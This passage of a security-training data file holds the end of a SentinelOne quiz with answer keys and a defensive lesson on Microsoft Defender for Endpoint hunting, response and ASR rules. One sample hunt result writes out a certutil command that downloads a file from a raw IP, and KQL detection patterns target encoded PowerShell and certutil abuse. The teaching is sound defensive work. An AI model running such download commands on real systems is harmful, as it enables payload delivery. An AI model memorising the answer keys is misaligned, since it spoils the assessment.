            "label": "Deep Visibility only stores events already tied to a Threat, so both rows must already be classified Threats before the query could return them",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Deep Visibility stores raw telemetry regardless of any Threat classification, so a matching parent-child shape is only a starting point — the src.process.cmdline content (a plain admin cmdlet versus a hidden, base64-encoded payload) is what actually distinguishes routine activity from an obfuscated attack. Option a wrongly treats the shape alone as proof. Option c invents a limitation PowerQuery does not have. Option d misdescribes Deep Visibility, which records raw events independent of Threat status."
      },
      {
        "question": "An endpoint in the 'Legacy App Servers' Group is running in Detect mode, but the Site and Account levels above it both show Protect mode configured. Why does this endpoint still behave as Detect-only, and what does this illustrate about SentinelOne's console structure?",
        "options": [
          {
            "label": "A Group-level policy override takes precedence over the inherited Site and Account settings for endpoints in that specific Group, so checking only the Site or Account level would miss the actual configuration applied",
            "value": "a"
          },
          {
            "label": "SentinelOne always applies the most permissive setting found anywhere in the hierarchy to every endpoint in the tenant, regardless of which level defined it",
            "value": "b"
          },
          {
            "label": "Detect mode versus Protect mode is set per individual endpoint at random and has no relationship to the Global, Account, Site, or Group hierarchy at all",
            "value": "c"
          },
          {
            "label": "The Group-level setting is a display error, since SentinelOne policy can only ever be configured at the Global level and every lower level always shows identical inherited values",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "SentinelOne's scope hierarchy (Global > Account > Site > Group) allows any level to override the policy it would otherwise inherit from above, and an override defined at the Group level applies specifically to that Group regardless of what the Site or Account above it shows. This means an analyst must check the actual effective policy at the endpoint's own Group level, not assume the Site or Account setting applies uniformly. Option b, c, and d each misdescribe how the inheritance and override model actually works."
      }
    ],
    "references": [
      "https://www.sentinelone.com/platform/singularity-xdr/",
      "https://www.sentinelone.com/blog/feature-spotlight-storyline-and-storylineactivecontent/",
      "https://www.sentinelone.com/cybersecurity-101/data-and-ai/what-is-rollback/",
      "https://www.sentinelone.com/platform/deep-visibility/",
      "https://attack.mitre.org/techniques/T1490/"
    ],
    "xp": 380,
    "estimatedMinutes": 72,
    "published_at": "2026-08-12T00:00:00.000Z",
    "createdAt": "2026-08-12T00:00:00.000Z",
    "researchUsed": false
  },
  {
    "id": "local-lesson-35",
    "slug": "defender-for-endpoint-console",
    "title": "Microsoft Defender for Endpoint: Advanced Hunting and Live Response",
    "topic": "Endpoint Security",
    "difficulty": "advanced",
    "kind": "lesson",
    "intro": "If your organization runs Microsoft's endpoint stack, the console you live in day to day is not a standalone product bolted onto the rest of your security tooling — it is one component, Defender for Endpoint (MDE), inside a larger unified platform called Microsoft Defender XDR, and the fact that it was built this way from the start shapes almost everything about how you work in it. An MDE alert does not sit in isolation; it can be automatically correlated with a phishing email flagged by Defender for Office, an identity anomaly flagged by Defender for Identity, and a risky OAuth grant flagged by Defender for Cloud Apps, all inside one Incident, in one portal, at security.microsoft.com. This lesson is specifically about MDE within that ecosystem — its device onboarding, its hunting language, its automation, and its response tooling — not a repeat of general EDR or XDR theory covered elsewhere on this platform.\n\nThe center of gravity for this lesson is **KQL, the Kusto Query Language**, because Advanced Hunting is arguably MDE's single most powerful capability and the one that most separates a working analyst from a merely reactive one. You will learn the core hunting tables — DeviceProcessEvents, DeviceNetworkEvents, DeviceLogonEvents, DeviceFileEvents, DeviceRegistryEvents — and how to build a working query from them piece by piece, not just read one someone else wrote. Alongside hunting, you will learn how MDE's Automated Investigation and Response (AIR) decides what it can safely remediate on its own versus what it escalates to you, the concrete difference between Device Isolation and Live Response and when each is the right tool, and how Attack Surface Reduction rules move from a safe audit mode to active blocking without your organization discovering the hard way that a rule breaks a business-critical workflow.\n\nBy the end of this lesson you will be able to write a KQL query from scratch to answer a specific hunting question rather than only recognizing one when you see it, correctly predict which parts of an incident AIR will handle automatically and which it will leave for you, choose correctly between isolating a device and opening a Live Response session depending on what the moment actually calls for, and explain why a security team deploys a new ASR rule in audit mode before ever letting it block anything in production.",
    "sections": [
      {
        "heading": "MDE Inside Defender XDR: Onboarding and the Device Inventory",
        "content": "### Zero to Hero: What This Console Actually Is\n\nBefore any of the specifics below make sense, get the basic picture straight. An **endpoint** is any single device a person actually uses or that runs a workload — a laptop, a desktop, a server. **EDR (Endpoint Detection and Response)** is the general category of security tool that watches everything an endpoint does — every process it starts, every file it touches, every network connection it makes — and lets an analyst investigate and respond when something looks wrong. **Microsoft Defender for Endpoint (MDE)** is Microsoft's own EDR product: an agent installed on each endpoint that reports telemetry back to a cloud console, letting you search that telemetry, read alerts, and take response actions like isolating a machine, all from a browser.\n\nThe console itself lives at security.microsoft.com — this single web portal is where you do essentially everything covered in this lesson: view devices, read alerts, write hunting queries, and respond to incidents. It is not a separate app you install; it is the web dashboard that MDE, and its sibling products, report into.\n\nTwo terms you will meet constantly from here on, defined once so nothing later assumes prior knowledge. **Advanced Hunting** is the feature that lets you write your own search query against raw telemetry instead of waiting for a built-in rule to notice something — think of it as a search bar, except the language you type into it is `KQL` (introduced next), and the data you search is every process, network connection, file, and login MDE has ever recorded across your fleet. A **custom detection** is what you get when a hunting query that reliably finds something bad gets saved so Defender runs it automatically, forever — turning a one-time question into a standing alarm.\n\nAnd since MDE almost never works alone: **Defender XDR** is the umbrella portal that ties MDE together with three sibling products protecting other parts of the environment — **MDO (Defender for Office 365)** for email, **MDI (Defender for Identity)** for on-premises Active Directory, and **MDCA (Defender for Cloud Apps)** for SaaS applications. Each gets a full explanation later in this lesson; for now, hold onto the idea that an MDE alert on one laptop is frequently only one piece of a bigger story visible elsewhere in the same portal.\n\nWith that vocabulary in place, the rest of this lesson walks through MDE in the order you would actually encounter it: getting a device protected, hunting through its data, letting automation help, responding when something is actively wrong, and hardening the environment so fewer alerts happen in the first place.\n\n**Microsoft Defender for Endpoint (MDE)** is one of four specialized components unified under **Microsoft Defender XDR**, accessed at security.microsoft.com, alongside:\n\n- **Defender for Office 365** — email and collaboration.\n- **Defender for Identity** — on-prem Active Directory and Entra ID.\n- **Defender for Cloud Apps** — SaaS application visibility.\n\nThis matters from your very first login: an MDE alert is never guaranteed to be the whole story, because Defender XDR is specifically designed to correlate a device-level detection with whatever else happened around the same user, the same time window, and the same attack — an alert that looks like an isolated PowerShell execution on one laptop can turn out, once correlated, to be step three of an incident that started with a phishing email and will continue with lateral movement Defender for Identity later flags on a domain controller.\n\n**Getting a device under MDE's protection starts with onboarding**, and how a device gets onboarded is itself operationally relevant, because different methods suit different environments and a mismatch is a common source of coverage gaps:\n\n- **Group Policy (GPO)** — deploys the onboarding package to domain-joined Windows machines through Active Directory, the most common path in traditional enterprise environments with an existing AD footprint.\n- **Microsoft Intune** — deploys through Mobile Device Management, better suited to modern, cloud-managed, Entra ID-joined devices and to BYOD scenarios where a GPO has no reach.\n- **Microsoft Configuration Manager (SCCM/MECM)** — serves organizations with substantial existing SCCM infrastructure who prefer to extend an already-established deployment mechanism rather than stand up a parallel one.\n- **Local script** — run manually on a single machine, used mainly for testing or very small-scale deployment rather than as a fleet-wide strategy.\n- **Linux and macOS** — onboard through their own package-based or management-tool-driven processes rather than GPO.\n\nWhen you find yourself investigating why a specific device never generated telemetry you expected, the onboarding method — and whether that specific method's deployment actually reached that device — is frequently the first thing worth checking, ahead of assuming the attacker somehow evaded a properly functioning sensor.\n\n**The Device Inventory (Assets > Devices) is where onboarded machines live in the console**, and its fields tell you more than just an inventory list. Each device shows its **Risk Level** — Critical, High, Medium, or Low — calculated from currently active alerts and known unpatched vulnerabilities on that machine, and its **Exposure Score**, a 0-100 measure of how vulnerable that specific device is to known attack techniques based on its patch state and configuration, independent of whether anything malicious has actually happened on it yet.\n\nThese two numbers answer two different questions that are easy to conflate: Risk Level tells you what is happening or has already happened on this device; Exposure Score tells you how attractive a target this device would be if nothing has happened yet. A device with a high Exposure Score and no current alerts is not an active incident, but it is a legitimate priority for proactive hardening before it becomes one.\n\n**Onboarding status and last-seen time deserve the same scrutiny here that they do in any EDR console.** A device that stopped checking in recently, especially one with a history of high Exposure Score or recent alerts, deserves the same suspicion any analyst should apply to a suddenly-silent sensor in any platform — it can mean a legitimate connectivity or power issue, or it can mean an attacker with sufficient privilege found a way to disable or evade the agent, and the console alone cannot tell you which without further investigation."
      },
      {
        "heading": "Advanced Hunting and KQL: The Five Tables Every Analyst Should Know Cold",
        "content": "**Advanced Hunting**, at security.microsoft.com under Hunting, is where an MDE analyst goes to ask a specific question of raw telemetry rather than wait for a rule to ask it for them — the same proactive posture threat hunting always requires, applied to Microsoft's specific data model. Queries are written in **KQL, the Kusto Query Language**, the same language used by Microsoft Sentinel, which means the skill transfers directly if your organization also runs Sentinel as its SIEM.\n\n**KQL's structure is built around the pipe operator**, written as a vertical bar, where each line takes the output of the line before it and transforms it further — filter, then filter again, then select specific columns, then aggregate, then sort, then limit. This pipeline structure is worth internalizing before memorizing any specific table, because it means you can build a complex query incrementally: start with a table name, add one filter, run it and look at the results, add the next filter, and keep narrowing until the output answers your actual question. A query that returns too much is fixed by adding another where clause; a query that returns nothing is fixed by removing your most recent one and checking your assumption.\n\n**Five tables cover the overwhelming majority of endpoint hunting an analyst does:**\n\n- **DeviceProcessEvents** — records every process creation: the file name, the full command line, the parent process, the user account, and the file's SHA256. It is the table you reach for first any time you are hunting for a specific command-line pattern like encoded PowerShell or an unusual parent-child relationship.\n- **DeviceNetworkEvents** — records network connections at the process level, including the initiating process, the remote IP, the remote port, and the URL where applicable. This is what you need to answer 'what did this process actually talk to' or 'which processes on my fleet connected to this specific external IP.'\n- **DeviceLogonEvents** — records authentication activity on the device itself, including the logon type, which distinguishes an interactive console logon from a network logon typical of lateral movement, from a remote-desktop logon.\n- **DeviceFileEvents** — tracks file creation, modification, and deletion, essential for tracing where a dropped payload landed or which files a ransomware process touched.\n- **DeviceRegistryEvents** — tracks registry key reads and writes, the table you need for hunting persistence mechanisms that live in Run keys or service configuration.\n\n### Building a working query, piece by piece\n\nTake the goal 'find PowerShell processes using encoded commands in the last 7 days,' one of the highest-value hunts an analyst can run because encoded PowerShell is disproportionately associated with malicious intent relative to how rarely legitimate administration needs it. Build it one decision at a time:\n\n1. Start with the table: DeviceProcessEvents.\n2. Add the time filter: where Timestamp greater than ago(7d).\n3. Narrow to the process of interest: where FileName equals powershell.exe.\n4. Add the pattern that actually matters: where ProcessCommandLine has '-Enc' or has '-EncodedCommand'.\n5. Select the columns you actually need to triage results efficiently rather than scrolling through every field: project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName.\n6. Order by Timestamp descending so the most recent, most actionable results surface first.\n\nEach of those six lines is a small, understandable decision, and reading any complex KQL query you encounter as a sequence of small decisions rather than one intimidating block is the fastest way to become fluent in reading — and eventually writing — hunting queries you did not author yourself.\n\n### Joining across tables is where hunting gets genuinely powerful\n\nA single table answers a narrow question; joining DeviceProcessEvents to DeviceNetworkEvents on the same device and a matching process identifier lets you ask a compound question no single table can answer alone — which processes were both created recently and made an outbound connection to a specific class of destination, which is exactly the kind of correlation a real investigation needs and a single-table query cannot provide.",
        "codeExample": "// Building a KQL hunt incrementally, one decision per line\n\nDeviceProcessEvents\n| where Timestamp > ago(7d)                          // time window\n| where FileName =~ \"powershell.exe\"                 // process of interest\n| where ProcessCommandLine has \"-Enc\"\n     or ProcessCommandLine has \"-EncodedCommand\"      // the pattern that matters\n| project Timestamp, DeviceName, AccountName,\n          ProcessCommandLine, InitiatingProcessFileName // only what you need\n| order by Timestamp desc                             // newest first\n\n// The five tables to know cold:\n//   DeviceProcessEvents    process creation, command line, SHA256\n//   DeviceNetworkEvents    connections, remote IP/port, initiating process\n//   DeviceLogonEvents      authentication events, logon type\n//   DeviceFileEvents       file create/modify/delete\n//   DeviceRegistryEvents   registry key reads/writes (persistence hunting)\n//\n// JOIN example - process + network in one question:\nDeviceProcessEvents\n| where Timestamp > ago(1d)\n| join kind=inner (DeviceNetworkEvents | where Timestamp > ago(1d))\n    on DeviceId, $left.ProcessId == $right.InitiatingProcessId\n| project Timestamp, DeviceName, FileName, ProcessCommandLine, RemoteIP, RemotePort",
        "image": {
          "src": "/lesson-images/edr/mde-advanced-hunting.svg",
          "alt": "A KQL query editor building a hunt line by line: start from DeviceProcessEvents, filter to the last 24 hours, filter to processes whose parent is winword.exe, keep only powershell.exe and cmd.exe, project five columns and order by time. Below it the five core Device tables and a results grid with three hits, one of which is a legitimate signed IT script.",
          "caption": "The query finds candidates; you still decide which are real - note the third row is a signed IT script.",
          "credit": "Illustrative mockup authored for this course. Not a screenshot of any vendor product."
        }
      },
      {
        "heading": "Alerts, Incidents, and Automated Investigation and Response",
        "content": "MDE generates **Alerts** when its detection engines — behavioral EDR sensors, antivirus, network protection, or threat intelligence matching — flag suspicious activity, and each Alert carries a severity, a detection source, and a MITRE ATT&CK tactic and technique mapping, the same structural pattern of tagging you have seen across other EDR consoles.\n\nWhere Defender XDR distinguishes itself is in how aggressively and how broadly it groups related Alerts into **Incidents** — not just related MDE alerts on one device, but alerts from any of the four Defender components that appear connected by shared entities: the same user, the same device, the same email, the same malicious IP. The Incident page's graph view visually maps those connections, letting you see at a glance whether an MDE detection on a laptop connects backward to a phishing email that Defender for Office flagged, and forward to an identity anomaly Defender for Identity caught on a domain controller — the full span of an attack, not just its endpoint-visible slice.\n\n**Automated Investigation and Response (AIR)** is Defender XDR's automation layer, and understanding what it is and is not designed to do prevents two opposite mistakes: assuming it handles everything, and manually redoing work it already completed. When an Incident is created, AIR can automatically investigate certain alert types, following much the same logical steps a human analyst would — checking a file's prevalence and reputation, examining the process tree, evaluating whether an artifact matches a known-clean baseline — and where its investigation reaches sufficiently high confidence, it can take remediation action on its own: quarantining a file, stopping a process, removing a persistence mechanism, without waiting for a human to approve each step.\n\n### AIR's confidence-based boundary is the important part to internalize\n\nAIR is built to handle the well-understood, high-confidence cases automatically — a file that clearly matches a known-malicious pattern with no ambiguity gets remediated immediately, the same class of case a human analyst would also resolve quickly and with full confidence.\n\nCases where the investigation surfaces genuine ambiguity — ambiguous verdicts, business-critical systems where an automatic action carries real operational risk if wrong, or a novel pattern the automation has not seen a clear precedent for — are surfaced for analyst approval instead, appearing in the Action Center as pending remediation actions awaiting a human decision before they execute. This is a deliberate design boundary, not a limitation to work around: the goal is for AIR to absorb the repetitive, unambiguous volume so analyst attention concentrates on the judgment calls that actually need it, not for AIR to replace analyst judgment on cases where a wrong automatic action could itself cause damage.\n\n### What this means for your workflow\n\nWhen you pick up an Incident, check the Action Center and AIR's investigation summary before duplicating work it may have already done — if AIR already quarantined the malicious file and confirmed no lateral spread, redoing that specific verification from scratch wastes time better spent on whatever AIR flagged as needing your judgment. Equally, do not assume an Incident with an AIR investigation attached is fully handled; read specifically what AIR concluded and what, if anything, it left pending, because a partially automated Incident with one pending approval sitting unreviewed in the Action Center is functionally the same as an unactioned alert until a human closes that specific gap.",
        "codeExample": "flowchart TD\n  A[\"Alert(s) grouped into an Incident\"] --> B[\"AIR investigates automatically\"]\n  B --> C{\"Investigation confidence?\"}\n  C -->|\"High confidence, clear verdict\"| D[\"AIR remediates automatically\\n(quarantine file, stop process, remove persistence)\"]\n  C -->|\"Ambiguous or high-risk system\"| E[\"Pending action queued in Action Center\"]\n  E --> F[\"Analyst reviews and approves or rejects\"]\n  D --> G[\"Analyst reviews AIR's summary,\\nfocuses on what AIR could NOT resolve\"]\n  F --> G"
      },
      {
        "heading": "Device Isolation vs. Live Response: Two Different Tools for Two Different Moments",
        "content": "MDE offers two response capabilities that are easy to conflate if you have not used both, but they solve different problems and are frequently used together in sequence rather than as alternatives to each other:\n\n- **Device Isolation** — cuts network access while keeping the console's channel to the device alive. Purpose: stop the spread, immediately.\n- **Live Response** — a remote interactive shell for browsing files, running commands, and collecting evidence. Purpose: investigate safely, ideally after the device is already isolated.\n\n| Aspect | Device Isolation | Live Response |\n| --- | --- | --- |\n| What it does | Cuts network access while keeping the console's channel to the device alive | A remote interactive shell for browsing files, running commands, and collecting evidence |\n| Purpose | Stop the spread, immediately | Investigate safely, ideally after the device is already isolated |\n| Nature of the action | Blunt, fast, high-impact, almost purely defensive | Investigative — collect files and memory dumps, run commands and scripts |\n| When in the sequence | First, to stop the bleeding | After isolation, to find out what happened and clean it up |\n\n**Device Isolation** cuts a device off from the network — with Microsoft's implementation specifically preserving the device's connection to the Defender for Endpoint cloud service so the console can still communicate with it, monitor it, and issue further commands, while blocking essentially all other network communication the device would otherwise have.\n\nThis is a blunt, fast, high-impact action, and its purpose is almost purely defensive: stop an active or suspected compromise from spreading further across the network, or stop an attacker's command-and-control channel from continuing to function, immediately, while deeper investigation happens. Isolation is the right call the moment you have enough evidence to believe a device is actively compromised and further network access poses ongoing risk — you do not need full certainty of what happened before isolating, because the cost of a false-positive isolation (a user temporarily losing network access on one device, and a straightforward release once cleared) is dramatically lower than the cost of leaving a genuinely compromised device connected while you continue investigating.\n\n**Live Response** is a different tool for a different moment: a remote, interactive shell to a device — most powerfully used on a device that has already been isolated, so the investigation itself happens without the added risk of the device having live network access to anything but the console. From a Live Response session, an analyst can browse the file system, collect specific files for offline analysis, run investigative commands like `tasklist` and `netstat`, execute response scripts, and collect memory dumps, all without physical access to the machine. Where Isolation answers 'how do I stop this from spreading right now,' Live Response answers 'now that it cannot spread, how do I actually find out what happened and clean it up.'\n\n### The sequence that gets this right, most of the time\n\nIsolate first, to stop the bleeding immediately with minimal deliberation required. Then open Live Response against the now-isolated device to investigate safely — collecting evidence, confirming scope, and running remediation commands — without the device retaining any ability to communicate further with an attacker's infrastructure or spread laterally while you work. Reversing this order, investigating a live, still-network-connected device at length before isolating it, gives an active attacker every additional minute of that investigation to notice they are being watched, escalate, exfiltrate further, or move laterally before you cut them off — a real and avoidable cost of hesitating on isolation.\n\n### When to skip isolation\n\nNot every alert warrants isolating a device immediately — a low-confidence Alert on a business-critical server, where isolation itself would cause significant operational disruption, may call for Live Response investigation first to confirm the finding before taking an action with real business cost, particularly when the underlying evidence does not yet support genuine confidence of active compromise. This is a judgment call that weighs the cost of isolating a device that turns out to be clean against the cost of leaving a genuinely compromised one connected, and it depends on the specific evidence in front of you, not a universal rule that applies identically to a shared workstation and a production database server."
      },
      {
        "heading": "Attack Surface Reduction Rules: Why You Deploy in Audit Before You Ever Block",
        "content": "**Attack Surface Reduction (ASR) rules** are a set of pre-built, targeted rules that block specific behaviors commonly abused by malware and attackers — Office applications creating child processes, executable content from email clients, obfuscated or otherwise suspicious script execution, and roughly a dozen more, each addressing one narrow, well-understood attack pattern rather than trying to be a general-purpose behavioral engine. Unlike Falcon's IOA engine or SentinelOne's Behavioral AI, which score behavior dynamically, ASR rules are closer to a curated list of specific, named behaviors an organization chooses to explicitly disallow, each one independently enabled or disabled.\n\n**Each ASR rule can run in one of several modes**, and the two that matter most for how a rule gets rolled out are **Audit mode** and **Block mode**. In Audit mode, the rule evaluates every matching event and logs what it would have done, without actually blocking anything — the behavior in question is allowed to proceed exactly as it would with the rule turned off entirely, but the console records every instance where the rule's condition was met. In Block mode, the rule actively prevents the matching behavior from executing at all, the moment its condition is met, with no analyst review in the loop before the block happens.\n\n### Why every serious rollout starts in Audit, not Block\n\nASR rules are powerful precisely because they target genuinely common attack patterns, but that same breadth means some rules can also match legitimate, if unusual, business software doing something that happens to resemble the pattern being blocked — a line-of-business application that spawns a child process the same way a malicious macro would, a legacy tool that runs a script in a way a well-known ASR rule was specifically built to catch.\n\nEnabling a new rule directly in Block mode, without first understanding what it would have caught in your specific environment, risks breaking a business-critical workflow the moment the rule goes live, with the first anyone hears about it being a help-desk ticket rather than a security review. Running the rule in Audit mode first for a representative period — commonly a few weeks, long enough to cover routine business cycles like a monthly reporting run or a periodic maintenance script — lets a security team review exactly what the rule would have blocked, using Advanced Hunting against the `DeviceEvents` table where ASR audit and block events are recorded, and identify any legitimate activity that needs an explicit exclusion carved out before the rule is switched to Block.\n\n### Reviewing audit data before flipping the switch\n\nThe review step is not optional friction — it is where a security team distinguishes a rule that is safe to enforce fleet-wide from one that needs targeted exclusions first, or from one whose specific behavior pattern simply does not fit how a particular business unit's software operates and may need to stay in Audit permanently for that segment while running in Block everywhere else.\n\nThis is conceptually the same discipline covered in the CrowdStrike lesson's discussion of prevention policy tuning and the SentinelOne lesson's discussion of Detect versus Protect mode: every vendor's platform gives a security team a way to observe before enforcing, and skipping that step in the name of moving faster is consistently how a security team ends up with either a business-disrupting outage or, in the opposite failure, a rule quietly reverted to Audit after the first complaint and never revisited — silently returning to zero protection while everyone assumes the rule is still active.\n\n### Where this leaves an analyst reviewing ASR-related events\n\nWhen you see a `DeviceEvents` entry showing an ASR rule fired in Audit mode, remember it means exactly what it says — the behavior was logged, not blocked, and whatever the rule was designed to stop actually happened on that device. Treat an Audit-mode ASR hit with the same investigative seriousness as any other detection; the only thing Audit mode changed was whether MDE intervened, not whether the underlying event was worth your attention.",
        "codeExample": "flowchart TD\n  A[\"New ASR rule identified for rollout\"] --> B[\"Enable in Audit mode\"]\n  B --> C[\"Run for a full business cycle (weeks)\"]\n  C --> D[\"Review DeviceEvents: what would this rule have blocked?\"]\n  D --> E{\"Any legitimate activity caught?\"}\n  E -->|\"Yes\"| F[\"Add targeted exclusions for that activity\"]\n  F --> D\n  E -->|\"No unexpected matches\"| G[\"Switch rule to Block mode\"]\n  G --> H[\"Rule now actively prevents the behavior fleet-wide\"]"
      },
      {
        "heading": "From Hunting Query to Custom Detection Rule",
        "content": "You have used **Advanced Hunting** to write KQL queries across MDE's tables. The step that turns hunting into lasting protection is promoting a good query into a **custom detection rule** — and it is one of the highest-leverage skills MDE offers, because it lets you encode *your* environment's knowledge into an automated detection the same way CrowdStrike's custom IOAs and SentinelOne's STAR do.\n\nThe workflow is direct and worth knowing: you develop and validate an **Advanced Hunting (KQL)** query that reliably identifies some malicious or unwanted behaviour, then **save it as a custom detection rule**. Microsoft Defender then runs that query **on a schedule** against incoming data, and every match **generates an alert** — and, if you configure it, **takes automated response actions** (isolate the device, collect an investigation package, run antivirus, restrict app execution). Your one-time hunt becomes a standing, automated detection that also *acts*.\n\nA few specifics make this work well in practice:\n\n- **The query must return the right entity columns.** A custom detection has to identify *what* to alert on and act against — the device, the account, the file — so the query needs to project those entity fields, which is what lets the rule attach the alert to the correct machine and enables response actions against it.\n- **Frequency and impact are yours to set.** You choose how often the rule runs and what actions it takes, which is where the tuning judgment lives: a broad query on a short interval that triggers automatic isolation can disrupt the business if it is noisy.\n- **This is detection-as-code in Microsoft's world.** A custom detection is a saved, reviewable, repeatable artifact built from a KQL query — the same durability principle as the Sigma section, expressed natively in Defender.\n\n### Worked Example: From Query, to Results, to Detection\n\nHere is the same discipline made concrete, using a well-known LOLBin abuse pattern: certutil.exe misused to download a file via its -urlcache and -split flags. The hunting query, built the same incremental way as before, against DeviceProcessEvents:\n\n```\nDeviceProcessEvents\n| where Timestamp > ago(14d)\n| where FileName =~ \"certutil.exe\"\n| where ProcessCommandLine has \"-urlcache\" and ProcessCommandLine has \"-split\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, SHA256\n| order by Timestamp desc\n```\n\nRunning it over the last two weeks might return rows like these:\n\n| Timestamp | DeviceName | AccountName | ProcessCommandLine | InitiatingProcessFileName |\n|---|---|---|---|---|\n| 2026-08-14 03:12:07 | FIN-WKS-0231 | j.alvarez | certutil.exe -urlcache -split -f hxxp://185.10.44.6/update.dat C:\\Users\\Public\\update.dat | cmd.exe |\n| 2026-08-11 14:02:55 | IT-JUMP-01 | svc-patchmgmt | certutil.exe -urlcache -split -f https://intranet.corp.local/agent.msi C:\\Temp\\agent.msi | powershell.exe |\n\nBoth rows match the same command pattern, but they do not deserve the same reaction. The first ran at 3 AM from a finance workstation, against a raw IP address rather than a resolvable domain, dropping its output into C:\\Users\\Public — a world-writable folder with no legitimate reason to hold a downloaded payload. The second ran during business hours, from a known patch-management service account, against an internal domain, into a temp folder — the ordinary signature of IT tooling. The query surfaces both as candidates; reading the surrounding fields is what separates the one worth escalating from the one that is routine noise.\n\nOnce a pattern like this has been validated against real traffic — refining the where clauses if a legitimate source keeps appearing, such as excluding the known patch-management account — it is ready to save as a custom detection rule. Defender then runs it on a schedule, and every match becomes an alert with DeviceName, AccountName, and SHA256 already available as the entity columns a response action would need. Start it alert-only; only add an automatic isolation action once you trust the query not to fire on rows like the second one above.\n\nThe obligation is the recurring one: **validate the query's fidelity before you wire it to a response.** Run it as a hunt, confirm it matches what you intend and little else, start the rule in an alert-only posture, and only then consider automatic actions — exactly the ASR audit-first discipline this lesson already teaches, applied to your own detections. The takeaway: Advanced Hunting is not only for one-off investigations — its real payoff is that a hunt you validate can become a custom detection that watches, alerts, and responds automatically from then on."
      },
      {
        "heading": "Defender XDR Correlation: When MDE Joins MDO, MDI, and MDCA",
        "content": "MDE is one part of a larger whole. Microsoft's real answer to the \"no single sensor sees everything\" problem is **Microsoft Defender XDR** — the unified portal that correlates MDE with its sibling products into a single incident, and understanding this is what lets you see a whole attack rather than four disconnected alerts. Knowing the family and how they combine is core to working in the Microsoft stack.\n\nThe four sensors that feed the correlation, each covering a domain MDE alone cannot:\n\n- **MDE — Defender for Endpoint** — the endpoints (where you already live).\n- **MDO — Defender for Office 365** — email and collaboration: phishing, malicious attachments and links, business email compromise.\n- **MDI — Defender for Identity** — on-premises Active Directory and identity: the Kerberos and credential-attack patterns from the AD lessons, seen at the domain-controller level.\n- **MDCA — Defender for Cloud Apps** — SaaS and cloud-app activity: risky OAuth grants, anomalous cloud logins, data movement in cloud apps.\n\nThe power is in the **correlation into one incident.** A real intrusion crosses these domains — a phishing email (MDO) delivers a payload that runs on a laptop (MDE), the attacker steals credentials and abuses them against AD (MDI), then logs into a cloud app to exfiltrate data (MDCA). Each product alone shows one fragment; **Defender XDR stitches all four fragments into a single incident** with a unified timeline, so the analyst sees the *whole* attack story rather than triaging four separate alerts that look minor in isolation. This is the concrete realisation of the XDR concept from the EDR lesson, delivered as an integrated Microsoft suite.\n\nFor the analyst, two consequences follow:\n\n- **Triage the incident, not the alert.** In Defender XDR you work the **correlated incident**, which already groups the related alerts across endpoint, email, identity, and cloud — so the severity and scope are visible up front, and you are far less likely to close a \"minor\" endpoint alert that is actually one step of a cross-domain attack.\n- **Know which sensor holds which half of the story.** When an MDE endpoint lead points to \"then they logged in,\" MDI (identity) and MDCA (cloud) are where that half lives — the \"change sensors\" discipline, made easy because they are already correlated in one portal.\n\nThe takeaway: MDE is powerful, but its greatest value in the Microsoft ecosystem is as *one contributor* to Defender XDR's correlated view. When you meet a cross-domain attack, the whole story is assembled for you across MDE, MDO, MDI, and MDCA — and learning to read the unified incident, not just the endpoint alert, is what the platform is built to reward."
      },
      {
        "heading": "Microsoft Defender Vulnerability Management: Where Detection Meets Exposure",
        "content": "Detecting an attack is reactive; knowing *where you are exposed before it happens* is proactive — and Microsoft Defender folds both into one console through **Microsoft Defender Vulnerability Management (MDVM)**. Understanding it rounds out the platform, because it connects the incident you are investigating to the weaknesses that made it possible, using the same MDE agent already on the endpoint.\n\nThe core idea is that the endpoint sensor does double duty: besides watching for attacks, it continuously reports each device's **vulnerabilities and exposure** — missing patches and known **CVEs**, insecure configurations, risky software, and exposed services — with **no separate vulnerability scanner** required. Defender rolls this up into an **exposure score** and prioritised **security recommendations**, so an organisation can see, live, which weaknesses on which machines pose the most risk and act on the ones that matter first.\n\nWhy this belongs in an analyst's mental model, even though it is often owned by a separate team:\n\n- **It reframes an incident's urgency.** When you are investigating a compromised host, knowing that MDVM flags it as running a critical, internet-exposed, unpatched CVE changes everything: it likely tells you *how* the attacker got in, raises the severity, and turns the remediation from \"clean the host\" into \"patch the flaw *and* clean the host, before they walk back in the same door.\"\n- **It connects detection to prevention.** The whole curriculum stresses that the strongest defences are structural. MDVM is where the endpoint platform surfaces the *preventable* exposure — the unpatched CVE, the risky configuration — so that response can feed back into reducing the attack surface, not just cleaning up after each hit.\n- **It supports proactive hunting.** \"Which of our internet-facing hosts have this newly-disclosed critical CVE?\" is a question MDVM answers directly, letting a SOC get ahead of a threat the moment it is announced rather than waiting to detect its exploitation.\n\nThe takeaway ties the endpoint platform together: the same MDE agent that detects and responds to attacks also maps your **exposure**, and a mature analyst reads both. When you work an incident, checking the host's vulnerability posture in MDVM often explains the *how*, sharpens the *severity*, and points at the *fix that keeps it from recurring* — the connection between detecting attacks and preventing the next one, delivered in the same console."
      },
      {
        "heading": "Indicators: Custom IOC Management for Files, IPs, URLs, and Certificates",
        "content": "Advanced Hunting answers the question 'what happened.' **Indicators**, found under Settings > Endpoints > Indicators, answer a different one: 'what should Defender automatically detect, block, or allow going forward, regardless of behavior.' This is MDE's equivalent of the artifact-based, IOC half of the detection picture — the counterpart to the behavior-based ASR rules and custom detections already covered, and structurally very similar to Falcon's IOC management and SentinelOne's exclusion and blocklist system.\n\n### The four indicator types\n\nMDE supports custom indicators across four categories, each with its own management tab in the console:\n\n- **File hashes** — block a specific file from executing, identified by its hash rather than its file name, so renaming the file does not evade the block.\n- **IP addresses** — block network communication to a specific known-malicious IP.\n- **URLs/domains** — block access to a specific malicious URL or domain.\n- **Certificates** — allow or block files and applications signed by a specific certificate, supplied in .CER or .PEM format. Certificate-based indicators carry a notable operational quirk worth remembering: they take precedence over file-hash allow indicators in Defender's evaluation pipeline, and creating or removing one can take up to three hours to fully propagate.\n\n### Operationalizing threat intelligence, and tuning out noise\n\nJust as Falcon's IOC management assigns a detect, prevent, or allow action to each indicator, MDE indicators serve the identical two purposes: proactively blocking known-bad artifacts pulled from a threat intelligence feed or advisory the moment they are added, and suppressing a confirmed false positive on a specific, known-clean file or certificate without waiting for a broader ASR or Antivirus policy change. Indicators can be entered individually through the console or bulk-imported from a CSV file, which matters operationally when an incident response effort needs to push dozens of malicious hashes and IPs from a threat intelligence report into blocking all at once rather than one at a time.\n\n### The same allowlisting discipline applies 